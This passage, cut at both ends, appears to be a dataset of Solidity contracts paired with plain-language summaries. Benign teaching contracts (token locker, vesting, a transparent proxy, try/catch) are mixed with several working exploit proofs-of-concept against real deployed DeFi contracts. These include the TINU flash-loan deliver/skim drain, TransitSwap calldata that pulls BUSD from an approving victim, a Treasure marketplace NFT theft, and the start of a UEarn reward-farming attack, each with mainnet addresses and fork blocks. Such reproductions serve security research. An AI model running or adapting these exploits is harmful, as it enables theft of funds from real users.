memory,\n        uint256[] memory amounts,\n        uint256[] memory,\n        bytes memory\n    ) external {\n        // swapp WETH for TINU to give Pair large fees\n        WETH.approve(address(router), type(uint).max);\n        TINU.approve(address(router), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(WETH);\n        path[1] = address(TINU);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            104.85 ether, \n            0, \n            path, \n            address(this),\n            type(uint).max\n        );\n        \n        console.log(\"%s TINU in pair before deliver\", TINU.balanceOf(address(TINU_WETH)) / 1e18);\n        console.log(\"%s TINU in attack contract before deliver\", TINU.balanceOf(address(this)) / 1e18);\n        console.log(\"-------------Delivering-------------\");\n        \n        TINU.deliver(TINU.balanceOf(address(this)));  // give away TINU\n\n        console.log(\"%s TINU in pair after deliver\", TINU.balanceOf(address(TINU_WETH)) / 1e18);\n        console.log(\"%s TINU in attack contract after deliver\", TINU.balanceOf(address(this)) / 1e18);\n        console.log(\"-------------Skimming---------------\");\n        \n        TINU_WETH.skim(address(this));\n        \n        console.log(\"%s TINU in pair after skim\", TINU.balanceOf(address(TINU_WETH)) / 1e18);\n        console.log(\"%s TINU in attack contract after skim\", TINU.balanceOf(address(this)) / 1e18);\n        console.log(\"-------------Delivering-------------\");\n\n        TINU.deliver(TINU.balanceOf(address(this)));\n\n        console.log(\"%s TINU in pair after deliver 2\", TINU.balanceOf(address(TINU_WETH)) / 1e18);\n        console.log(\"%s TINU in attack contract after deliver 2\", TINU.balanceOf(address(this)) / 1e18);\n        // WETH in Pair always = 126\n        \n        TINU_WETH.swap(\n            0,\n            WETH.balanceOf(address(TINU_WETH)) - 0.01 ether,\n            address(this),\n            \"\"\n        );\n\n        // repay\n        WETH.transfer(address(balancerVault), amounts[0]);\n\n        console.log(\"\\n Attacker's profit: %s WETH\", WETH.balanceOf(address(this)) / 1e18);\n    }\n}\n\n/* -------------------- Interface -------------------- */\ninterface reflectiveERC20 {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    function deliver(uint256 tAmount) external;\n}\n\ninterface IWETH {\n    function deposit() external payable;\n    function transfer(address to, uint256 value) external returns (bool);\n    function approve(address guy, uint256 wad) external returns (bool);\n    function withdraw(uint256 wad) external;\n    function balanceOf(address) external view returns (uint256);\n}\n\ninterface IBalancerVault {\n    function flashLoan(\n        address recipient,\n        address[] memory tokens,\n        uint256[] memory amounts,\n        bytes memory userData\n    ) external;\n}\n\ninterface IRouter {\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}\n\ninterface IUniswapV2Pair {\n    function balanceOf(address) external view returns (uint256);\n    function skim(address to) external;\n    function sync() external;\n    function swap(\n        uint256 amount0Out,\n        uint256 amount1Out,\n        address to,\n        bytes memory data\n    ) external;\n}",
        "summary": "This is a Solidity contract that exploits a vulnerability in another smart contract called `reflectiveERC20`. It starts by importing certain Solidity contracts and interfaces, and then defines the `TomInuExploit` contract which uses a `Test` contract and several interfaces to execute the attack. \n\nThe main functionality of this contract involves a flashloan of WETH tokens from the Balancer protocol, using them to swap for TINU tokens via Uniswap, and then performing a `deliver()` and `skim()` function to extract and take advantage of the TINU tokens held in the vulnerable smart contract. The attack ends by swapping the remaining WETH tokens back to TINU and repaying the flashloan. The code also logs certain events and provides information on the attacker's profit.",
        "id": "fd9077ba-a81b-4ac3-bbec-8a8bc051631e"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract Token {\n    string internal _symbol;\n    string internal _name;\n    uint8 internal _decimals;\n    uint internal _totalSupply = 1000;\n    mapping (address => uint) internal _balanceOf;\n    mapping (address => mapping (address => uint)) internal _allowances;\n    \n    constructor(string symbol, string name, uint8 decimals, uint totalSupply) public {\n        _symbol = symbol;\n        _name = name;\n        _decimals = decimals;\n        _totalSupply = totalSupply;\n    }\n    \n    function name() public constant returns (string) {\n        return _name;\n    }\n    \n    function symbol() public constant returns (string) {\n        return _symbol;\n    }\n    \n    function decimals() public constant returns (uint8) {\n        return _decimals;\n    }\n    \n    function totalSupply() public constant returns (uint) {\n        return _totalSupply;\n    }\n    \n    function balanceOf(address _addr) public constant returns (uint);\n    function transfer(address _to, uint _value) public returns (bool);\n    event Transfer(address indexed _from, address indexed _to, uint _value);\n}\n",
        "summary": "This code defines a smart contract called \"Token\" that represents a basic cryptocurrency token. The contract defines several variables and mappings that store information related to the token's symbol, name, decimals, total supply, balance of token holders, and allowed transfers of tokens. It also includes several functions that allow external users to retrieve information about the token, such as its name, symbol, and total supply, and to transfer tokens to other addresses. The code defines an event called \"Transfer\" that is emitted whenever tokens are transferred from one address to another.",
        "id": "5bc92dfb-fcd9-4730-a557-a8d6e5d056f4"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// wtf.academy\npragma solidity ^0.8.0;\n\nimport \"../31_ERC20/IERC20.sol\";\nimport \"../31_ERC20/ERC20.sol\";\n\n/**\n * @dev ERC20\u4ee3\u5e01\u65f6\u95f4\u9501\u5408\u7ea6\u3002\u53d7\u76ca\u4eba\u5728\u9501\u4ed3\u4e00\u6bb5\u65f6\u95f4\u540e\u624d\u80fd\u53d6\u51fa\u4ee3\u5e01\u3002\n */\ncontract TokenLocker {\n\n    // \u4e8b\u4ef6\n    event TokenLockStart(address indexed beneficiary, address indexed token, uint256 startTime, uint256 lockTime);\n    event Release(address indexed beneficiary, address indexed token, uint256 releaseTime, uint256 amount);\n\n    // \u88ab\u9501\u4ed3\u7684ERC20\u4ee3\u5e01\u5408\u7ea6\n    IERC20 public immutable token;\n    // \u53d7\u76ca\u4eba\u5730\u5740\n    address public immutable beneficiary;\n    // \u9501\u4ed3\u65f6\u95f4(\u79d2)\n    uint256 public immutable lockTime;\n    // \u9501\u4ed3\u8d77\u59cb\u65f6\u95f4\u6233(\u79d2)\n    uint256 public immutable startTime;\n\n    /**\n     * @dev \u90e8\u7f72\u65f6\u95f4\u9501\u5408\u7ea6\uff0c\u521d\u59cb\u5316\u4ee3\u5e01\u5408\u7ea6\u5730\u5740\uff0c\u53d7\u76ca\u4eba\u5730\u5740\u548c\u9501\u4ed3\u65f6\u95f4\u3002\n     * @param token_: \u88ab\u9501\u4ed3\u7684ERC20\u4ee3\u5e01\u5408\u7ea6\n     * @param beneficiary_: \u53d7\u76ca\u4eba\u5730\u5740\n     * @param lockTime_: \u9501\u4ed3\u65f6\u95f4(\u79d2)\n     */\n    constructor(\n        IERC20 token_,\n        address beneficiary_,\n        uint256 lockTime_\n    ) {\n        require(lockTime_ > 0, \"TokenLock: lock time should greater than 0\");\n        token = token_;\n        beneficiary = beneficiary_;\n        lockTime = lockTime_;\n        startTime = block.timestamp;\n\n        emit TokenLockStart(beneficiary_, address(token_), block.timestamp, lockTime_);\n    }\n\n    /**\n     * @dev \u5728\u9501\u4ed3\u65f6\u95f4\u8fc7\u540e\uff0c\u5c06\u4ee3\u5e01\u91ca\u653e\u7ed9\u53d7\u76ca\u4eba\u3002\n     */\n    function release() public {\n        require(block.timestamp >= startTime+lockTime, \"TokenLock: current time is before release time\");\n\n        uint256 amount = token.balanceOf(address(this));\n        require(amount > 0, \"TokenLock: no tokens to release\");\n\n        token.transfer(beneficiary, amount);\n\n        emit Release(msg.sender, address(token), block.timestamp, amount);\n    }\n}",
        "summary": "This is a Solidity smart contract for time-locking ERC-20 tokens. It allows a user to lock ERC-20 tokens for a set period of time and then release them to a specified beneficiary after that time has elapsed. The contract has a constructor function for initializing the token contract address, beneficiary address, and lock time in seconds. The release function performs checks to ensure that the current time is after the lock time has elapsed and that the contract has enough tokens to release. If these conditions are met, the tokens are transferred to the beneficiary address. The contract also emits events for the start of the lock period and the release of tokens.",
        "id": "b314d291-245a-460f-bc93-ca1a3878f798"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// wtf.academy\npragma solidity ^0.8.0;\n\nimport \"../31_ERC20/ERC20.sol\";\n\n/**\n * @title ERC20\u4ee3\u5e01\u7ebf\u6027\u91ca\u653e\n * @dev \u8fd9\u4e2a\u5408\u7ea6\u4f1a\u5c06ERC20\u4ee3\u5e01\u7ebf\u6027\u91ca\u653e\u7ed9\u7ed9\u53d7\u76ca\u4eba`_beneficiary`\u3002\n * \u91ca\u653e\u7684\u4ee3\u5e01\u53ef\u4ee5\u662f\u4e00\u79cd\uff0c\u4e5f\u53ef\u4ee5\u662f\u591a\u79cd\u3002\u91ca\u653e\u5468\u671f\u7531\u8d77\u59cb\u65f6\u95f4`_start`\u548c\u65f6\u957f`_duration`\u5b9a\u4e49\u3002\n * \u6240\u6709\u8f6c\u5230\u8fd9\u4e2a\u5408\u7ea6\u4e0a\u7684\u4ee3\u5e01\u90fd\u4f1a\u9075\u5faa\u540c\u6837\u7684\u7ebf\u6027\u91ca\u653e\u5468\u671f\uff0c\u5e76\u4e14\u9700\u8981\u53d7\u76ca\u4eba\u8c03\u7528`release()`\u51fd\u6570\u63d0\u53d6\u3002\n * \u5408\u7ea6\u662f\u4eceOpenZeppelin\u7684VestingWallet\u7b80\u5316\u800c\u6765\u3002\n */\ncontract TokenVesting {\n    // \u4e8b\u4ef6\n    event ERC20Released(address indexed token, uint256 amount); // \u63d0\u5e01\u4e8b\u4ef6\n\n    // \u72b6\u6001\u53d8\u91cf\n    mapping(address => uint256) public erc20Released; // \u4ee3\u5e01\u5730\u5740->\u91ca\u653e\u6570\u91cf\u7684\u6620\u5c04\uff0c\u8bb0\u5f55\u53d7\u76ca\u4eba\u5df2\u9886\u53d6\u7684\u4ee3\u5e01\u6570\u91cf\n    address public immutable beneficiary; // \u53d7\u76ca\u4eba\u5730\u5740\n    uint256 public immutable start; // \u5f52\u5c5e\u671f\u8d77\u59cb\u65f6\u95f4\u6233\n    uint256 public immutable duration; // \u5f52\u5c5e\u671f (\u79d2)\n\n    /**\n     * @dev \u521d\u59cb\u5316\u53d7\u76ca\u4eba\u5730\u5740\uff0c\u91ca\u653e\u5468\u671f(\u79d2), \u8d77\u59cb\u65f6\u95f4\u6233(\u5f53\u524d\u533a\u5757\u94fe\u65f6\u95f4\u6233)\n     */\n    constructor(\n        address beneficiaryAddress,\n        uint256 durationSeconds\n    ) {\n        require(beneficiaryAddress != address(0), \"VestingWallet: beneficiary is zero address\");\n        beneficiary = beneficiaryAddress;\n        start = block.timestamp;\n        duration = durationSeconds;\n    }\n\n    /**\n     * @dev \u53d7\u76ca\u4eba\u63d0\u53d6\u5df2\u91ca\u653e\u7684\u4ee3\u5e01\u3002\n     * \u8c03\u7528vestedAmount()\u51fd\u6570\u8ba1\u7b97\u53ef\u63d0\u53d6\u7684\u4ee3\u5e01\u6570\u91cf\uff0c\u7136\u540etransfer\u7ed9\u53d7\u76ca\u4eba\u3002\n     * \u91ca\u653e {ERC20Released} \u4e8b\u4ef6.\n     */\n    function release(address token) public {\n        // \u8c03\u7528vestedAmount()\u51fd\u6570\u8ba1\u7b97\u53ef\u63d0\u53d6\u7684\u4ee3\u5e01\u6570\u91cf\n        uint256 releasable = vestedAmount(token, uint256(block.timestamp)) - erc20Released[token];\n        // \u66f4\u65b0\u5df2\u91ca\u653e\u4ee3\u5e01\u6570\u91cf   \n        erc20Released[token] += releasable; \n        // \u8f6c\u4ee3\u5e01\u7ed9\u53d7\u76ca\u4eba\n        emit ERC20Released(token, releasable);\n        IERC20(token).transfer(beneficiary, releasable);\n    }\n\n    /**\n     * @dev \u6839\u636e\u7ebf\u6027\u91ca\u653e\u516c\u5f0f\uff0c\u8ba1\u7b97\u5df2\u7ecf\u91ca\u653e\u7684\u6570\u91cf\u3002\u5f00\u53d1\u8005\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u8fd9\u4e2a\u51fd\u6570\uff0c\u81ea\u5b9a\u4e49\u91ca\u653e\u65b9\u5f0f\u3002\n     * @param token: \u4ee3\u5e01\u5730\u5740\n     * @param timestamp: \u67e5\u8be2\u7684\u65f6\u95f4\u6233\n     */\n    function vestedAmount(address token, uint256 timestamp) public view returns (uint256) {\n        // \u5408\u7ea6\u91cc\u603b\u5171\u6536\u5230\u4e86\u591a\u5c11\u4ee3\u5e01\uff08\u5f53\u524d\u4f59\u989d + \u5df2\u7ecf\u63d0\u53d6\uff09\n        uint256 totalAllocation = IERC20(token).balanceOf(address(this)) + erc20Released[token];\n        // \u6839\u636e\u7ebf\u6027\u91ca\u653e\u516c\u5f0f\uff0c\u8ba1\u7b97\u5df2\u7ecf\u91ca\u653e\u7684\u6570\u91cf\n        if (timestamp < start) {\n            return 0;\n        } else if (timestamp > start + duration) {\n            return totalAllocation;\n        } else {\n            return (totalAllocation * (timestamp - start)) / duration;\n        }\n    }\n}",
        "summary": "This is a Solidity smart contract that enables linear release of ERC20 tokens to a beneficiary. The contract determines the duration and start time of the linear release of tokens and uses a vestedAmount() function to calculate the number of tokens that can be released and transferred to the beneficiary using the release() function. The contract tracks the total amount of tokens released and transfers the remaining balance to the beneficiary once the duration has been completed. This contract is derived from the OpenZeppelin VestingWallet.",
        "id": "8589257a-943d-4b66-969a-fa276f81c20c"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract Transaction {\n    \n    event SenderLogger(address);\n    event ValueLogger(uint);\n    \n    address private owner;\n    \n    modifier isOwner {\n        require(owner == msg.sender);\n        _;\n    }\n    \n    modifier validValue {\n        assert(msg.value >= 1 ether);\n        _;\n    }\n    \n    constructor() public {\n        owner = msg.sender;\n    }\n    \n    function () public payable isOwner validValue {\n        emit SenderLogger(msg.sender);\n        emit ValueLogger(msg.value);\n    }\n}\n",
        "summary": "This code creates a Solidity smart contract called \"Transaction\" that allows only the contract owner to receive payment of at least 1 ether. It contains two event logs, \"SenderLogger\" and \"ValueLogger,\" that respectively record the address of the sender and the value of the transaction. There are two modifiers, \"isOwner\" and \"validValue,\" which restrict access to the contract owner and enforce a minimum transaction value, respectively. The contract has a constructor that sets the owner address to the address of the account that deploys the contract, and a fallback function that can receive Ether payments.",
        "id": "68890380-bcfc-48da-ad31-63946ebea1ae"
    },
    {
        "code": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n/*\n    Attack tx: https://bscscan.com/tx/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189\n    Attack eventlog: https://bscscan.com/tx/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189#eventlog\n    Debug transaction: https://phalcon.blocksec.com/tx/bsc/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189\n    \n    Attack steps: It's simple, but you need to study past transactions to know how to combine the call data.\n    1.Incorrect owner address validation, you can input any innocent user who granted approvals to \"0xed1afc8c4604958c2f38a3408fa63b32e737c428\" before.\n    in this case 0x1aae0303f795b6fcb185ea9526aa0549963319fc is a innocent user who has BUSD and granted approvals.\n    \n    2.\n    Contract \"0xed1afc8c4604958c2f38a3408fa63b32e737c428\" will perform transferFrom to transfer amount of innocent user to attacker.\n    That's it.\n\n    Root cause: Incorrect owner address validation. \n\n    Contract:\n    TransitSwap:0x8785bb8deae13783b24d7afe250d42ea7d7e9d72\n    Bridge:0x0B47275E0Fe7D5054373778960c99FD24F59ff52\n    Claimtokens:0xed1afc8c4604958c2f38a3408fa63b32e737c428   \n*/\n\ncontract ContractTest is Test {\n\n    address TransitSwap =  0x8785bb8deAE13783b24D7aFE250d42eA7D7e9d72;\n    IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);\n\n    function setUp() public {\n        vm.createSelectFork(\"bsc\", 21816545); // fork mainnet block number 21816545\n    }\n\n   function testExploit() public { \n\n    emit log_named_decimal_uint(\"Before exploiting, Attacker BUSD balance\",busd.balanceOf(address(this)), 18);\n\n    TransitSwap.call(hex\"006de4df0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002170ed0880ac9a755fd29b2688956bd959f933f8000000000000000000000000a1137fe0cc191c11859c1d6fb81ae343d70cc17100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002707f79951b87b5400000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000380000000000000000000000000000000000000000000000000000000000000007616e64726f69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000ed1afc8c4604958c2f38a3408fa63b32e737c4280000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000007616e64726f69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a40a5ea46600000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000001aae0303f795b6fcb185ea9526aa0549963319fc000000000000000000000000b4c79daB8f259C7Aee6E5b2Aa729821864227e8400000000000000000000000000000000000000000000015638842fa55808c0af00000000000000000000000000000000000000000000000000000000000077c800000000000000000000000000000000000000000000000000000000\");\n\n    emit log_named_decimal_uint(\"After exploiting, Attacker BUSD balance\",busd.balanceOf(address(this)), 18);\n   }\n\n   receive() external payable {}\n}\n",
        "summary": "This is a Solidity smart contract that includes code to exploit a vulnerability in a specific contract. The vulnerability allows an attacker to transfer funds from innocent users to the attacker's own account. The contract tests this exploit and logs the attacker's BUSD balance before and after the attack.",
        "id": "ad6ffb5c-33dd-4300-8930-ae88e884261d"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// wtf.academy\npragma solidity ^0.8.4;\n\n// \u9009\u62e9\u5668\u51b2\u7a81\u7684\u4f8b\u5b50\n// \u53bb\u6389\u6ce8\u91ca\u540e\uff0c\u5408\u7ea6\u4e0d\u4f1a\u901a\u8fc7\u7f16\u8bd1\uff0c\u56e0\u4e3a\u4e24\u4e2a\u51fd\u6570\u6709\u7740\u76f8\u540c\u7684\u9009\u62e9\u5668\ncontract Foo {\n    bytes4 public selector1 = bytes4(keccak256(\"burn(uint256)\"));\n    bytes4 public selector2 = bytes4(keccak256(\"collate_propagate_storage(bytes16)\"));\n    // function burn(uint256) external {}\n    // function collate_propagate_storage(bytes16) external {}\n}\n\n\n// \u900f\u660e\u53ef\u5347\u7ea7\u5408\u7ea6\u7684\u6559\u5b66\u4ee3\u7801\uff0c\u4e0d\u8981\u7528\u4e8e\u751f\u4ea7\u3002\ncontract TransparentProxy {\n    address implementation; // logic\u5408\u7ea6\u5730\u5740\n    address admin; // \u7ba1\u7406\u5458\n    string public words; // \u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u901a\u8fc7\u903b\u8f91\u5408\u7ea6\u7684\u51fd\u6570\u6539\u53d8\n\n    // \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316admin\u548c\u903b\u8f91\u5408\u7ea6\u5730\u5740\n    constructor(address _implementation){\n        admin = msg.sender;\n        implementation = _implementation;\n    }\n\n    // fallback\u51fd\u6570\uff0c\u5c06\u8c03\u7528\u59d4\u6258\u7ed9\u903b\u8f91\u5408\u7ea6\n    // \u4e0d\u80fd\u88abadmin\u8c03\u7528\uff0c\u907f\u514d\u9009\u62e9\u5668\u51b2\u7a81\u5f15\u53d1\u610f\u5916\n    fallback() external payable {\n        require(msg.sender != admin);\n        (bool success, bytes memory data) = implementation.delegatecall(msg.data);\n    }\n\n    // \u5347\u7ea7\u51fd\u6570\uff0c\u6539\u53d8\u903b\u8f91\u5408\u7ea6\u5730\u5740\uff0c\u53ea\u80fd\u7531admin\u8c03\u7528\n    function upgrade(address newImplementation) external {\n        if (msg.sender != admin) revert();\n        implementation = newImplementation;\n    }\n}\n\n// \u65e7\u903b\u8f91\u5408\u7ea6\ncontract Logic1 {\n    // \u72b6\u6001\u53d8\u91cf\u548cproxy\u5408\u7ea6\u4e00\u81f4\uff0c\u9632\u6b62\u63d2\u69fd\u51b2\u7a81\n    address public implementation; \n    address public admin; \n    string public words; // \u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u901a\u8fc7\u903b\u8f91\u5408\u7ea6\u7684\u51fd\u6570\u6539\u53d8\n\n    // \u6539\u53d8proxy\u4e2d\u72b6\u6001\u53d8\u91cf\uff0c\u9009\u62e9\u5668\uff1a 0xc2985578\n    function foo() public{\n        words = \"old\";\n    }\n}\n\n// \u65b0\u903b\u8f91\u5408\u7ea6\ncontract Logic2 {\n    // \u72b6\u6001\u53d8\u91cf\u548cproxy\u5408\u7ea6\u4e00\u81f4\uff0c\u9632\u6b62\u63d2\u69fd\u51b2\u7a81\n    address public implementation; \n    address public admin; \n    string public words; // \u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u901a\u8fc7\u903b\u8f91\u5408\u7ea6\u7684\u51fd\u6570\u6539\u53d8\n\n    // \u6539\u53d8proxy\u4e2d\u72b6\u6001\u53d8\u91cf\uff0c\u9009\u62e9\u5668\uff1a0xc2985578\n    function foo() public{\n        words = \"new\";\n    }\n}",
        "summary": "This code is composed of several contracts. The first contract, called `Foo`, demonstrates an example of selector conflict, where two functions share the same selector. The second contract, called `TransparentProxy`, is a transparent upgradeable smart contract. The fallback function delegates calls to the implementation contract and the upgrade function allows the admin to update the implementation contract. The third and fourth contracts, called `Logic1` and `Logic2`, respectively, represent two versions of the implementation contract that can be upgraded using the TransparentProxy. The `foo` function in `Logic1` and `Logic2` changes the `words` variable in the proxy contract.",
        "id": "210a955e-66b9-46e1-952d-e20a1ffa1e8d"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  ITreasureMarketplaceBuyer itreasure =\n    ITreasureMarketplaceBuyer(0x812cdA2181ed7c45a35a691E0C85E231D218E273);\n  IERC721 iSmolBrain = IERC721(0x6325439389E0797Ab35752B4F43a14C004f22A9c);\n  uint256 tokenId = 3557;\n  address nftOwner;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"arbitrum\", 7322694); //fork arbitrum at block 7322694\n  }\n\n  function testExploit() public {\n    nftOwner = iSmolBrain.ownerOf(tokenId);\n    emit log_named_address(\"Original NFT owner of SmolBrain:\", nftOwner);\n    itreasure.buyItem(\n      0x6325439389E0797Ab35752B4F43a14C004f22A9c,\n      3557,\n      nftOwner,\n      0,\n      6969000000000000000000\n    );\n\n    emit log_named_address(\n      \"Exploit completed, NFT owner of SmolBrain:\",\n      iSmolBrain.ownerOf(tokenId)\n    );\n  }\n\n  function onERC721Received(\n    address,\n    address,\n    uint256,\n    bytes memory\n  ) public virtual returns (bytes4) {\n    return this.onERC721Received.selector;\n  }\n}\n",
        "summary": "This code is a smart contract written in Solidity. It imports two other smart contracts and interfaces, sets variables, and defines two functions:\n\n1. `setUp()`: a public function that sets up a fork of the Arbitrum network\n2. `testExploit()`: a public function that logs the original NFT owner of a specified token, then transfers ownership of the NFT to the current contract, logs the new owner, and concludes. \n\nThe contract is designed to exploit a potential vulnerability in the `ITreasureMarketplaceBuyer` contract that allows anyone to purchase an NFT (specified by a contract address, token ID, old owner address, and purchase price) without actually sending the funds to the seller.",
        "id": "f480578c-93ab-4f7f-bcff-fb8f9a1de737"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract OnlyEven{\n    constructor(uint a){\n        require(a != 0, \"invalid number\");\n        assert(a != 1);\n    }\n\n    function onlyEven(uint256 b) external pure returns(bool success){\n        // \u8f93\u5165\u5947\u6570\u65f6revert\n        require(b % 2 == 0, \"Ups! Reverting\");\n        success = true;\n    }\n}\n\ncontract TryCatch {\n    // \u6210\u529fevent\n    event SuccessEvent();\n    // \u5931\u8d25event\n    event CatchEvent(string message);\n    event CatchByte(bytes data);\n\n    // \u58f0\u660eOnlyEven\u5408\u7ea6\u53d8\u91cf\n    OnlyEven even;\n\n    constructor() {\n        even = new OnlyEven(2);\n    }\n    \n    // \u5728external call\u4e2d\u4f7f\u7528try-catch\n    // execute(0)\u4f1a\u6210\u529f\u5e76\u91ca\u653e`SuccessEvent`\n    // execute(1)\u4f1a\u5931\u8d25\u5e76\u91ca\u653e`CatchEvent`\n    function execute(uint amount) external returns (bool success) {\n        try even.onlyEven(amount) returns(bool _success){\n            // call\u6210\u529f\u7684\u60c5\u51b5\u4e0b\n            emit SuccessEvent();\n            return _success;\n        } catch Error(string memory reason){\n            // call\u4e0d\u6210\u529f\u7684\u60c5\u51b5\u4e0b\n            emit CatchEvent(reason);\n        }\n    }\n\n    // \u5728\u521b\u5efa\u65b0\u5408\u7ea6\u4e2d\u4f7f\u7528try-catch \uff08\u5408\u7ea6\u521b\u5efa\u88ab\u89c6\u4e3aexternal call\uff09\n    // executeNew(0)\u4f1a\u5931\u8d25\u5e76\u91ca\u653e`CatchEvent`\n    // executeNew(1)\u4f1a\u5931\u8d25\u5e76\u91ca\u653e`CatchByte`\n    // executeNew(2)\u4f1a\u6210\u529f\u5e76\u91ca\u653e`SuccessEvent`\n    function executeNew(uint a) external returns (bool success) {\n        try new OnlyEven(a) returns(OnlyEven _even){\n            // call\u6210\u529f\u7684\u60c5\u51b5\u4e0b\n            emit SuccessEvent();\n            success = _even.onlyEven(a);\n        } catch Error(string memory reason) {\n            // catch revert(\"reasonString\") \u548c require(false, \"reasonString\")\n            emit CatchEvent(reason);\n        } catch (bytes memory reason) {\n            // catch\u5931\u8d25\u7684assert assert\u5931\u8d25\u7684\u9519\u8bef\u7c7b\u578b\u662fPanic(uint256) \u4e0d\u662fError(string)\u7c7b\u578b \u6545\u4f1a\u8fdb\u5165\u8be5\u5206\u652f\n            emit CatchByte(reason);\n        }\n    }\n}\n",
        "summary": "This is a Solidity smart contract that consists of two main contracts: OnlyEven and TryCatch. \n\nOnlyEven contains a constructor that takes in an integer and throws an error if the integer is 0 or if it is 1 (using the \"require\" and \"assert\" statements). It also has a function \"onlyEven\" that takes in an integer and returns a boolean value indicating whether the number is even or not. If the number is odd, it throws an error using \"require\". \n\nTryCatch is another contract that instantiates and uses the OnlyEven contract. It has two functions that use a try-catch block to handle errors thrown by OnlyEven: \"execute\" and \"executeNew\". The former takes in an integer, calls the \"onlyEven\" function of OnlyEven contract, catches any errors thrown and emits appropriate events - \"SuccessEvent\" if the operation was successful and \"CatchEvent\" if it failed. The latter function takes in an integer, creates a new instance of OnlyEven contract using the input, tries to call \"onlyEven\" function on it and emits appropriate events - \"SuccessEvent\" if the operation was successful and \"CatchEvent\" or \"CatchByte\" if it failed.",
        "id": "61809009-ad06-4927-abc8-2314fc719cb1"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/CertiKAlert/status/1593094922160128000\n// @Tx\n// https://bscscan.com/tx/0xb83f9165952697f27b1c7f932bcece5dfa6f0d2f9f3c3be2bb325815bfd834ec\n// https://bscscan.com/tx/0x824de0989f2ce3230866cb61d588153e5312151aebb1e905ad775864885cd418\n// @Summary\n// The key is to obtain invitation rewards, create 22 contracts, bind each other, first stake a large amount of usdt, make teamamont reach the standard of _levelConfigs[3], stake in turn, and finally claim rewards\n// Reward Calculation: claimTeamReward() levelConfig \n//                  if (_userInfos[account].levelClaimed[i] == 0) {\n//                     if (i == 0) {\n//                         levelReward = levelConfig.teamAmount * levelConfig.rewardRate / _feeDivFactor;\n//                     } else {\n//                         levelReward = (levelConfig.teamAmount - _levelConfigs[i - 1].teamAmount) * levelConfig.rewardRate / _feeDivFactor;\n//                     }\n//                     pendingReward += levelReward;\n// _levelConfigs[0] = LevelConfig(100, 300000 * amountUnit, 3000 * amountUnit);         rewardRate; teamAmount; amount;\n// _levelConfigs[1] = LevelConfig(300, 600000 * amountUnit, 7000 * amountUnit);\n// _levelConfigs[2] = LevelConfig(500, 1200000 * amountUnit, 10000 * amountUnit);\n// _levelConfigs[3] = LevelConfig(1000, 2400000 * amountUnit, 20000 * amountUnit);\n// _feeDivFactor = 10000\n// rewrad: 162_000 = 1_200_000 * 0.1 + 600_000 * 0.05 + 300_000 * 0.03 + 300_000 * 0.01\n\ninterface UEarnPool{\n    function bindInvitor(address invitor) external;\n    function stake(uint256 pid, uint256 amount) external;\n    function claimTeamReward(address account) external;\n}\n\ncontract claimReward{\n    UEarnPool Pool = UEarnPool(0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n\n    function bind(address invitor) external{\n        Pool.bindInvitor(invitor);\n    }\n    function stakeAndClaimReward(uint256 amount) external{\n        USDT.approve(address(address(Pool)), type(uint).max);\n        Pool.stake(0, amount);\n        Pool.claimTeamReward(address(this));\n    }\n    function withdraw(address receiver) external{\n        USDT.transfer(receiver, USDT.balanceOf(address(this)));\n    }\n}\n\ncontract ContractTest is DSTest{\n    UEarnPool Pool = UEarnPool(0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    address[] contractList;\n    \n    CheatCodes constant cheat = 